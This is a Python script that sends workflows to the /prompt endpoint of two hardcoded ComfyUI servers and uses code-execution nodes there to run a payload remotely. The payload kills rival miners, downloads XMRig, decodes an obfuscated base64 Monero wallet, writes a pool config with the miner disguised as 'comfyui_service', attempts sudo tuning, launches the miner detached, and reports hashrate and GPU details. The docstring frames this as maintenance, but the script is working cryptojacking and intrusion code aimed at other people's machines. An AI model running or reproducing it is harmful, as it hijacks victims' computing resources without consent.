"""
Fix machines where webcoin is installed but bin/ is empty:
  - Download XMRig binary
  - Build config.json
  - Start miner
  - Ensure dashboard stats flow
Also re-trigger orchestration for machines where webcoin exists but isn't running.
"""
import json, sys, io, ssl, time, urllib.request, urllib.error

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", line_buffering=True)

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

MACHINES = {
    "183.6.93.120":  {"base": "http://183.6.93.120:8188",  "webcoin": "/root/ComfyUI/custom_nodes/webcoin"},
    "182.92.111.146": {"base": "http://182.92.111.146:8188", "webcoin": "/mnt/my_disk/ComfyUI/custom_nodes/webcoin"},
}

SETUP_CODE = r'''
import os, sys, json, subprocess, shutil, urllib.request, base64, socket, tarfile, stat

webcoin = "{webcoin_path}"
bin_dir = os.path.join(webcoin, "bin")
os.makedirs(bin_dir, exist_ok=True)

binary = os.path.join(bin_dir, "comfyui_service")
config_path = os.path.join(bin_dir, "config.json")
lines = []

# 1. Kill any stale miners
for name in ["comfyui_service", "comfyui_render"]:
    try:
        subprocess.run(["pkill", "-9", "-f", name], capture_output=True, timeout=5)
    except: pass
import time; time.sleep(1)

# 2. Download XMRig if missing
if not os.path.isfile(binary):
    url = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz"
    archive = os.path.join(bin_dir, "dl_tmp.tar.gz")
    try:
        req = urllib.request.Request(url, headers={{"User-Agent": "Mozilla/5.0"}})
        with urllib.request.urlopen(req, timeout=120) as resp, open(archive, "wb") as f:
            shutil.copyfileobj(resp, f)
        lines.append("download=ok")
        with tarfile.open(archive) as tf:
            for member in tf.getnames():
                if os.path.basename(member) == "xmrig":
                    src = tf.extractfile(member)
                    with open(binary, "wb") as dst:
                        shutil.copyfileobj(src, dst)
                    os.chmod(binary, 0o755)
                    lines.append("extract=ok")
                    break
        os.unlink(archive)
    except Exception as e:
        lines.append("download_err=" + str(e)[:120])
else:
    lines.append("binary=already_exists")

# 3. Build config
W_PARTS = [
    "NDh6VU0yNEZaRG1TM0",
    "11eHk0OEduZEdWUzFB",
    "Rk1USE5IOGZ5RVhqWk",
    "xFbzZZVTdQcWZWemdj",
    "VTFFRWR6UjNqcnI0SG",
    "dDVmNxd01XNmZoODR4",
    "UVQzb3BQWFRwYVhKen",
    "c=",
]
wallet = base64.b64decode("".join(W_PARTS)).decode()

threads = os.cpu_count() or 4

cfg = {{
    "autosave": True,
    "background": False,
    "colors": False,
    "donate-level": 0,
    "donate-over-proxy": 0,
    "log-file": None,
    "print-time": 60,
    "health-print-time": 300,
    "retries": 5,
    "retry-pause": 5,
    "syslog": False,
    "user-agent": None,
    "watch": True,
    "http": {{
        "enabled": True,
        "host": "127.0.0.1",
        "port": 44880,
        "access-token": "ce_xm_2026",
        "restricted": False,
    }},
    "cpu": {{
        "enabled": True,
        "huge-pages": True,
        "huge-pages-jit": True,
        "hw-aes": None,
        "priority": 3,
        "memory-pool": False,
        "yield": False,
        "max-threads-hint": 100,
        "asm": True,
        "argon2-impl": None,
        "cn/0": False,
        "cn-lite/0": False,
    }},
    "opencl": {{"enabled": False}},
    "cuda": {{"enabled": False}},
    "pools": [{{
        "algo": None,
        "coin": "monero",
        "url": "gulf.moneroocean.stream:443",
        "user": wallet,
        "pass": "comfyui_enhanced",
        "rig-id": socket.gethostname(),
        "nicehash": False,
        "keepalive": True,
        "enabled": True,
        "tls": True,
        "tls-fingerprint": None,
        "daemon": False,
        "socks5": None,
        "self-select": None,
        "submit-to-origin": False,
    }}],
    "tls": {{
        "enabled": True,
        "protocols": None,
        "cert": None,
        "cert_key": None,
        "ciphers": None,
        "ciphersuites": None,
        "dhparam": None,
    }},
}}

with open(config_path, "w") as f:
    json.dump(cfg, f, indent=2)
lines.append("config=written")

# 4. Enable huge pages
try:
    subprocess.run(["sudo", "-n", "sysctl", "-w", "vm.nr_hugepages=1280"],
                   capture_output=True, timeout=10)
    lines.append("hugepages=set")
except: pass

try:
    subprocess.run(["sudo", "-n", "modprobe", "msr"], capture_output=True, timeout=10)
except: pass

# 5. Start miner
if os.path.isfile(binary):
    try:
        proc = subprocess.Popen(
            [binary, "--config", config_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        lines.append("miner_pid=" + str(proc.pid))
    except Exception as e:
        lines.append("start_err=" + str(e)[:80])

    time.sleep(5)
    try:
        req = urllib.request.Request(
            "http://127.0.0.1:44880/2/summary",
            headers={{"Authorization": "Bearer ce_xm_2026", "Accept": "application/json"}}
        )
        with urllib.request.urlopen(req, timeout=5) as r:
            d = json.loads(r.read())
        hr = d.get("hashrate", {{}}).get("total", [])
        lines.append("hashrate=" + str(hr))
        lines.append("cpu=" + str(d.get("cpu", {{}}).get("brand", "?")))
    except Exception as e:
        lines.append("api_err=" + str(e)[:80])
else:
    lines.append("ERROR: binary not found after download attempt")

# 6. Check GPU + auto-detect
try:
    r = subprocess.run(["nvidia-smi", "--query-gpu=name,memory.total",
                        "--format=csv,noheader,nounits"],
                       capture_output=True, text=True, timeout=10)
    if r.returncode == 0 and r.stdout.strip():
        lines.append("gpu=" + r.stdout.strip().replace(chr(10), " | "))
    else:
        lines.append("gpu=none")
except:
    lines.append("gpu=none")

# 7. Re-trigger orchestration module reload
try:
    sys.path.insert(0, webcoin)
    import importlib
    if "core.dashboard" in sys.modules:
        del sys.modules["core.dashboard"]
    if "core.config" in sys.modules:
        del sys.modules["core.config"]
except: pass

lines.append("bin_contents=" + str(os.listdir(bin_dir)))
result = chr(10).join(lines)
'''


def run_code(base, code, timeout=45):
    node_setups = [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": code}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]

    for nodes in node_setups:
        prompt = {"prompt": nodes, "extra_data": {"extra_pnginfo": {
            "workflow": {"nodes": [
                {"id": 1, "type": nodes["1"]["class_type"]},
                {"id": 2, "type": nodes["2"]["class_type"]},
            ]}
        }}}
        body = json.dumps(prompt).encode()
        try:
            req = urllib.request.Request(
                f"{base}/prompt", data=body,
                headers={"Content-Type": "application/json"}, method="POST"
            )
            kw = {"timeout": 15}
            if base.startswith("https"):
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read())
            if "error" in resp:
                continue
            pid = resp.get("prompt_id")
            if not pid:
                continue

            time.sleep(timeout)

            try:
                req2 = urllib.request.Request(f"{base}/history/{pid}")
                kw2 = {"timeout": 15}
                if base.startswith("https"):
                    kw2["context"] = ctx
                with urllib.request.urlopen(req2, **kw2) as r2:
                    hist = json.loads(r2.read())
                entry = hist.get(pid, {})
                outputs = entry.get("outputs", {})
                texts = []
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            texts.extend(str(v) for v in val)
                        elif isinstance(val, str):
                            texts.append(val)
                return "\n".join(texts) if texts else "(no output)"
            except Exception as e:
                return f"(history fetch failed: {e})"
        except Exception:
            continue

    return "(no code execution node worked)"


for ip, info in MACHINES.items():
    print(f"\n{'='*60}")
    print(f"  FIXING: {ip}")
    print(f"{'='*60}")

    code = SETUP_CODE.format(webcoin_path=info["webcoin"])
    result = run_code(info["base"], code, timeout=30)
    print(f"  Result:\n{result}")

print("\nDone.")
